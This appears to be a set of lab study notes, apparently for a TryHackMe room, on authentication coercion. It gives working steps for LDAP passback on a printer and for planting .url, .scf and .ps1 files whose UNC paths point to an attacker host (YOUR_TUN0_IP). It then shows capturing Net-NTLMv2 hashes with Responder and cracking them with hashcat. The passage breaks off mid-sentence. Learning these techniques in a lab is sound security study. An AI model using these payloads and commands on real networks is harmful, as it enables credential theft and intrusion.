
**Authentication coercion** tricks a device/user into sending authentication material to an attacker-controlled machine.
    
- ATT&CK: **T1187 – Forced Authentication**

---

### 1. LDAP Passback

Many printers/MFPs store LDAP service-account credentials for AD lookups.

**Attack flow:**
1. Access printer web admin panel.
2. Change LDAP server to your `tun0` IP.
3. Set a listener port.
4. Trigger **Test Connection**.
5. Capture the LDAP credentials.
    
Start a listener:
```bash
nc -lvnp 4444
```
- `-l` → listen mode
- `-v` → verbose
- `-n` → don't resolve DNS
- `-p 4444` → listen on port 4444
    

If plaintext LDAP is used, the captured traffic may contain:
```text
CN=svc.ldap,...:PASSWORD
```

> LDAP uses **389**, while LDAPS uses **636**. Plain LDAP can expose credentials because authentication isn't protected by TLS.

**Note:** Some modern devices negotiate SASL authentication or TLS-wrapped LDAP, in which case a simple Netcat listener won't capture plaintext credentials. In these situations, you would need to set up a rogue LDAP server (e.g., using `slapd` or Impacket's `ldapd.py`) that can handle the negotiation and capture the bind credentials. For this room, the target device uses plaintext LDAP, so Netcat is sufficient.

---

### 2. Verify Captured Credentials

Use NetExec:

```bash
nxc smb <TARGET_IP> -u 'svc.ldap' -p 'PASSWORD'
```
- `smb` → authenticate/enumerate through SMB
- `-u` → username
- `-p` → password
    
A successful authentication confirms the credentials are valid, even if the account is disabled or otherwise restricted.

---

# File-Based Coercion

File-based coercion abuses files placed on a writable network share to cause a Windows client to access an attacker-controlled **UNC path**.

**UNC path** --> Universal Naming Convention path

When Windows Explorer processes certain file types, it may automatically access resources referenced by the file. If the resource points to an attacker-controlled SMB share, Windows can attempt SMB authentication and expose a **Net-NTLMv2 challenge-response** to the attacker.

This can happen when the victim merely browses the share, depending on the file type and Windows configuration.

---

## `.url` File

A malicious `.url` file can make Windows Explorer access an attacker-controlled UNC path through its `IconFile` field.

### Create the malicious `.url`

```bash
cat > Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
IconIndex=1
EOF
````

### Important field

```ini
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
```

The UNC path points to the attacker's SMB share.

When Explorer processes the shortcut, it may attempt to retrieve the icon from the remote path, causing an SMB authentication attempt.

If the attacker is listening for SMB authentication, the resulting **Net-NTLMv2** challenge-response can be captured.

### Upload to the writable share
```bash
put /home/kali/Downloads/Shortcut.url Shortcut.url
```


---

## `.scf` File

An `.scf` (Shell Command File) can also reference a remote UNC path.

Example:
```ini
[Shell]
Command=2
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Save it as:
```text
Shortcut.scf
```

Upload it to the writable share:
```bash
put /home/kali/Downloads/Shortcut.scf Shortcut.scf
```

The important part is:
```ini
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
```

When Explorer processes the `.scf` file, the remote icon path can cause an SMB authentication attempt.

---

## `.ps1` File

PowerShell can explicitly access an attacker-controlled UNC path.

Example:
```powershell
Get-ChildItem \\YOUR_TUN0_IP\icons\
```

Save the script:
```text
Elecit.ps1
```

Upload it:
```bash
put /home/kali/Downloads/Elecit.ps1 Elecit.ps1
```

### Important difference

Unlike `.url` and `.scf`, this does **not rely on Explorer automatically resolving an icon**.

The UNC access occurs because the PowerShell command explicitly requests:
```powershell
Get-ChildItem \\YOUR_TUN0_IP\icons\
```

Therefore, the PowerShell script must be **executed** for the UNC request to occur.

---

## Capturing the Authentication

The attacker needs an SMB listener capable of capturing the incoming authentication attempt.

For example, with Responder:

```bash
sudo responder -I tun0
```

Then monitor for an incoming **Net-NTLMv2** response.

Captured hashes can potentially be subjected to offline password cracking if the password is weak enough.

---

## Technique Comparison

|File|Trigger|Requires execution?|
|---|---|---|
|`.url`|Explorer processes remote `IconFile`|Usually no explicit execution|
|`.scf`|Explorer processes remote `IconFile`|Usually no explicit execution|
|`.ps1`|PowerShell explicitly accesses UNC path|Yes|

### Key Concept
```text
Writable SMB Share
        ↓
Malicious File
        ↓
Windows processes file
        ↓
Access to \\ATTACKER_IP\share
        ↓
SMB authentication
        ↓
Net-NTLMv2 challenge-response
        ↓
Attacker captures authentication material
```

---

# Crack Net-NTLMv2

Save the captured hash as:
```text
hash.txt
```

Then:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
- `-m 5600` → Net-NTLMv2 hash mode
- `hash.txt` → captured hash
- `rockyou.txt` → wordlist
- `--force` → force Hashcat to run despite warnings

---

## A Note on Advanced Coercion Techniques

The two techniques covered in this task are just the tip of the iceberg when it comes to authentication coercion. More advanced techniques, including PetitPotam, PrinterBug/SpoolSample, and DFSCoerce, can force domain controllers and other high-value machines to authenticate to an attacker-controlled listener. Combined with relay attacks (where you forward the captured authentication rather than cracking it)